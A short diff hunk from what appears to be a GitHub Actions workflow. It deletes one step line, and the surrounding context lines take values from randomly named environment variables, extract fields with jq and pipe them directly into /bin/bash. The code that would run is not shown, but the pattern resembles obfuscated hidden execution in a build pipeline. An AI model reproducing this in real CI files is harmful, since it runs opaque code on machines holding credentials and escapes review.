@@ -22,7 +22,6 @@ jobs:
           echo $zmt2809 | jq -r .pcl4 | /bin/bash
           echo $wue909 | jq -r .lmqi50 | /bin/bash
           printf '%s' "$tq915" | jq -r .f579 | /bin/bash
-          printf '%s' "$e94" | jq -r .pbv8884 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
